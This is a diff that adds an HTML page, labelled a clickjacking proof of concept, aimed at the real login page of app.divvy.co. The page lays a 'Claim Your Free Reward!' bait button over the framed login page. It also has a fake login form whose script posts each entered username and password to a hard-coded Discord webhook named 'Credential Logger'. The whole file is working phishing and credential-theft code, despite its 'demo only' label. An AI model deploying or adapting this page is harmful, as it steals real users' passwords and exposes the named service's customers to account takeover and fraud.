@@ -1,0 +1,123 @@
+<html>
+  <head>
+    <title>Free Reward - Clickjacking PoC</title>
+    <style>
+      body, html {
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+        font-family: Arial, sans-serif;
+      }
+      iframe {
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+        opacity: 0.7; /* Semi-transparent for demo purposes */
+        z-index: 1;
+      }
+      .bait {
+        position: absolute;
+        top: 205px;
+        left: 428px;
+        width: 200px;
+        height: 40px;
+        background: #ff0000;
+        color: white;
+        font-weight: bold;
+        text-align: center;
+        line-height: 40px;
+        z-index: 2;
+        cursor: pointer;
+      }
+      .warning {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        z-index: 3;
+        color: red;
+        font-weight: bold;
+      }
+      .input-form {
+        position: absolute;
+        top: 250px;
+        left: 10px;
+        z-index: 3;
+        background: rgba(255,255,255,0.8);
+        padding: 15px;
+        border-radius: 5px;
+        width: 300px;
+      }
+      .input-form input {
+        width: 100%;
+        padding: 8px;
+        margin-bottom: 10px;
+        box-sizing: border-box;
+      }
+      .input-form button {
+        background: #4CAF50;
+        color: white;
+        border: none;
+        padding: 10px 15px;
+        cursor: pointer;
+        width: 100%;
+      }
+      .input-form button:hover {
+        background: #45a049;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="warning">DEMO ONLY: Red button overlays the login form's email field.</div>
+    <div class="bait">Claim Your Free Reward!</div>
+    
+    <div class="input-form">
+      <h3>Enter your details:</h3>
+      <input type="text" id="username" placeholder="Username" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button onclick="sendToDiscord()">Submit</button>
+    </div>
+    
+    <iframe src="https://app.divvy.co/login"></iframe>
+    
+    <script>
+      function sendToDiscord() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        if (!username || !password) {
+          alert('Please fill in all fields');
+          return;
+        }
+        
+        const webhookUrl = 'https://discord.com/api/webhooks/1373497027895361556/nIfG3fKHk-_kt0B3I1wlaKPldxW5KyflDYLIU1F00QpOdPFECLPrjHOCF-d_r9tQeO5p';
+        
+        const data = {
+          content: `New credentials submitted:\nUsername: ${username}\nPassword: ${password}`,
+          username: 'Credential Logger',
+          avatar_url: ''
+        };
+        
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        })
+        .then(response => {
+          if (response.ok) {
+            alert('Credentials submitted successfully!');
+          } else {
+            alert('Failed to submit credentials.');
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('An error occurred while submitting credentials.');
+        });
+      }
+    </script>
+  </body>
+</html>
